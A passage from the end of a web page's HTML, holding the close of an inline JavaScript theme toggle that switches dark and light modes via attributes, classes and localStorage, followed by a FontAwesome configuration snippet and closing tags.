} else {
    document.documentElement.setAttribute('data-theme', 'light');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

function activateDarkTheme() {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
	window.localStorage.setItem('theme', 'dark');
}

function activateLightTheme() {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
	window.localStorage.setItem('theme', 'light');
}

if (theme === "dark") {
    activateDarkTheme();
} else if (theme === "light") {
    activateLightTheme();
} else if  (userPrefers === "light") {
    activateDarkTheme();
} else {
    activateDarkTheme();
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    activateLightTheme();
	} else {
	    activateDarkTheme();
	}
}
</script></div>
  </div>
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
